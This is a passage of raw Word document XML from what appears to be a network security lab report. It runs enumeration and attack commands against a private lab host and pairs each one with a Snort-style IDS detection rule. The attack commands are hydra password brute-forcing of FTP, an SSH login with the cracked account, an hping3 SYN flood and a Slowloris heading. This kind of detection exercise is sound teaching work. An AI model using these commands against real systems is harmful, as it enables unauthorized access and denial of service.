      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B9F099" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>HTTP Request Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert http any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve">:"HTTP request detected"; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>content:"GET</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>"; sid:1000005;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FED9F7" w14:textId="6D5F956D" w:rsidR="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E292371" wp14:editId="5B416AE9">
            <wp:extent cx="5572125" cy="419100"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="585744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44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5FCF" w14:textId="77777777" w:rsidR="00EF3D1C" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20FCC108" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Enumeration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1B8623C1" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">3.1 FTP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Enumeration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="04166069" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27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697D3F95" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ftp 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FD341D" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>FTP Transfer Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any 21 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"FTP Transfer Detected"; sid:1000007;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E15F651" w14:textId="09C29A37" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B7A8B4A" wp14:editId="507A9568">
            <wp:extent cx="5573395" cy="330200"/>
            <wp:effectExtent l="0" t="0" r="8255" b="0"/>
            <wp:docPr id="2138965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65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3F8B" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">3.2 SMB </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Enumeration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="046D8CBB" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28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79BC99D4" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>enum4linux -a 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5366472F" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SMB Enumeration Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any 445 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"SMB Enumeration Detected"; sid:1000006;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702DB7AD" w14:textId="3D9B4646" w:rsidR="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B109872" wp14:editId="1F3053F2">
            <wp:extent cx="5573395" cy="391795"/>
            <wp:effectExtent l="0" t="0" r="8255" b="8255"/>
            <wp:docPr id="68836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63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F2B3" w14:textId="31F53E9F" w:rsidR="00EF3D1C" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00EF3D1C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3.</w:t>
      </w:r>
      <w:r w:rsidR="00A302C5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r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Cewl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2FB224" w14:textId="77777777" w:rsidR="00EF3D1C" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28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5FD1E53E" w14:textId="1FF5BDF9" w:rsidR="00EF3D1C" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00EF3D1C">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t>Cewl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r w:rsidRPr="00EF3D1C">
          <w:rPr>
            <w:rStyle w:val="Hipervnculo"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>http://192.168.1.10</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t xml:space="preserve"> -d 3 -w user</w:t>
      </w:r>
      <w:r>
        <w:t>names.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12547762" w14:textId="3A9825C0" w:rsidR="00EF3D1C" w:rsidRPr="00EF3D1C" w:rsidRDefault="00EF3D1C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28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r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Detects http requests and port scans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E4D601" w14:textId="77777777" w:rsidR="00EF3D1C" w:rsidRPr="00DD27AB" w:rsidRDefault="00EF3D1C" w:rsidP="00DD27AB"/>
    <w:p w14:paraId="24EC6129" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00A302C5" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>4. Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3D2989" w14:textId="20BBEAA0" w:rsidR="00A302C5" w:rsidRPr="00A302C5" w:rsidRDefault="00A302C5" w:rsidP="00DD27AB">
      <w:r w:rsidRPr="00A302C5">
        <w:t>Firstly, we need to get the credentials using hydra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F5EB33" w14:textId="77777777" w:rsidR="00A302C5" w:rsidRPr="00D1363F" w:rsidRDefault="00A302C5" w:rsidP="00A302C5">
      <w:r w:rsidRPr="00A302C5">
        <w:t>Command</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve">hydra -l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t>msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve"> -P </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>hydraIncursion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">/random-passwords.txt </w:t>
      </w:r>
      <w:r w:rsidRPr="00D1363F">
        <w:t>ftp://192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DF71C8" w14:textId="0DF2D58B" w:rsidR="00A302C5" w:rsidRPr="00A302C5" w:rsidRDefault="00A302C5" w:rsidP="00A302C5">
      <w:pPr>
        <w:ind w:left="709" w:hanging="709"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37F6E7B3" wp14:editId="3CC6224E">
            <wp:extent cx="5400675" cy="2571750"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="9125455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45520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828" w14:textId="3F3A86BF" w:rsidR="00A302C5" w:rsidRPr="00DD27AB" w:rsidRDefault="00A302C5" w:rsidP="00DD27AB">
      <w:r w:rsidRPr="00A302C5">
        <w:t>With this we got the password and we can access freely FTP, SSH…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B58185F" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">4.1 FTP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Exploitation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1DABAA03" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29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5DA60317" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00EF3D1C">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ftp 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D16691" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>FTP Transfer Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any 21 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"FTP Transfer Detected"; sid:1000007;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5325F636" w14:textId="4084B951" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00A302C5" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="04CC2C46" wp14:editId="5F3CF4B5">
            <wp:extent cx="5573395" cy="320040"/>
            <wp:effectExtent l="0" t="0" r="8255" b="3810"/>
            <wp:docPr id="1699670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701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54B3" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">4.2 SSH </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Exploitation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="67B5441F" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30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345374F7" w14:textId="18B7660F" w:rsidR="00EF3D1C" w:rsidRPr="00EF3D1C" w:rsidRDefault="00EF3D1C" w:rsidP="00EF3D1C">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t xml:space="preserve">ssh -o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t>HostKeyAlgorithms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t>=+ssh-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t>rsa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r w:rsidRPr="00EF3D1C">
          <w:rPr>
            <w:rStyle w:val="Hipervnculo"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>msfadmin@192.168.1.10</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3422BBC6" w14:textId="78BFD70C" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SSH Login Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any 22 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"SSH Login Detected"; sid:1000009;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338A657C" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">4.3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>DDoS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with</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> hping3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F64159E" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31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1D9E4ADB" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00EF3D1C">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>hping3 -S --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>flood</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p 80 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B36A78" w14:textId="7321CB83" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31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r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SYN Flood Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any 80 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve">:"SYN Flood Detected"; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>flags:S</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>; sid:1000010;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45085FFA" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB" w:rsidP="00DD27AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">4.4 HTTP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Exploitation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with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Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6D56C053" w14:textId="77777777" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Attacker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Command</w:t>
      </w:r>
